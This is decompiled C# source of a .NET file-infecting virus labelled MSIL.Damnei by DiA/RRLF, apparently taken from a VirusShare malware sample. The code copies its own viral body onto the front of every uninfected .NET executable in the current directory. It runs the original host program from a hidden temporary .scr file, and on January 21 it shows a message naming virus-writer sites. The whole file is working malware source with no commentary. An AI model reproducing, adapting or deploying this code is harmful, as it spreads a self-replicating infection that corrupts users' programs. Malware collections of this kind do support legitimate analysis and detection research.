// Decompiled with JetBrains decompiler
// Type: FirstPrep.DamneiVirus
// Assembly: FirstPrep, Version=1.0.2213.28388, Culture=neutral, PublicKeyToken=null
// MVID: 46B1E01E-D7F8-4B55-B7B0-B711CAFCABC5
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Virus.MSIL.Small.f-d09dd4820bc9019c9d5c26971a031da48d9bca91576d2d828155cc1246f92c3a.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Windows.Forms;

namespace FirstPrep
{
  public class DamneiVirus
  {
    public void Start()
    {
      int length = 20480;
      int index1 = 8422;
      string fileName = Process.GetCurrentProcess().MainModule.FileName;
      byte[] numArray1 = new byte[length];
      FileStream input1 = new FileStream(fileName, FileMode.Open, FileAccess.Read);
      BinaryReader binaryReader1 = new BinaryReader((Stream) input1);
      for (int index2 = 0; index2 < length; ++index2)
        numArray1[index2] = binaryReader1.ReadByte();
      byte[] numArray2 = new byte[input1.Length - (long) length];
      int index3 = 0;
      try
      {
        while (true)
        {
          numArray2[index3] = binaryReader1.ReadByte();
          ++index3;
        }
      }
      catch (EndOfStreamException ex)
      {
      }
      binaryReader1.Close();
      input1.Close();
      foreach (string file in Directory.GetFiles(Directory.GetCurrentDirectory(), "*.exe"))
      {
        try
        {
          AssemblyName.GetAssemblyName(file);
        }
        catch (BadImageFormatException ex)
        {
          continue;
        }
        try
        {
          FileStream input2 = new FileStream(file, FileMode.Open, FileAccess.Read);
          BinaryReader binaryReader2 = new BinaryReader((Stream) input2);
          byte[] numArray3 = new byte[input2.Length];
          int index4 = 0;
          try
          {
            while (true)
            {
              numArray3[index4] = binaryReader2.ReadByte();
              ++index4;
            }
          }
          catch (EndOfStreamException ex)
          {
          }
          if ((int) numArray1[index1] == (int) numArray3[index1])
          {
            binaryReader2.Close();
            input2.Close();
          }
          else
          {
            binaryReader2.Close();
            input2.Close();
            FileStream output = new FileStream(file, FileMode.Open, FileAccess.Write);
            BinaryWriter binaryWriter = new BinaryWriter((Stream) output);
            for (int index5 = 0; index5 < length; ++index5)
              binaryWriter.BaseStream.WriteByte(numArray1[index5]);
            for (int index6 = 0; index6 < numArray3.Length; ++index6)
              binaryWriter.BaseStream.WriteByte(numArray3[index6]);
            binaryWriter.Close();
            output.Close();
          }
        }
        catch (Exception ex)
        {
        }
      }
      string str = "temp" + new Random(DateTime.Now.Millisecond).Next(10000).ToString() + ".scr";
      FileStream output1 = new FileStream(str, FileMode.Create, FileAccess.Write);
      BinaryWriter binaryWriter1 = new BinaryWriter((Stream) output1);
      for (int index7 = 0; index7 < numArray2.Length; ++index7)
        binaryWriter1.BaseStream.WriteByte(numArray2[index7]);
      binaryWriter1.Close();
      output1.Close();
      File.SetAttributes(str, FileAttributes.Hidden);
      if (DateTime.Now.Month == 1)
      {
        if (DateTime.Now.Day == 21)
        {
          int num1 = (int) MessageBox.Show("http://www.vx-dia.de.vu/ - http://www.rrlf.de.vu/", "Infected with MSIL.Damnei by DiA/RRLF");
        }
      }
      try
      {
        Process.Start(str).WaitForExit();
      }
      catch (Exception ex)
      {
        int num2 = (int) MessageBox.Show("Can not execute " + fileName, "Error");
      }
      File.Delete(str);
    }
  }
}
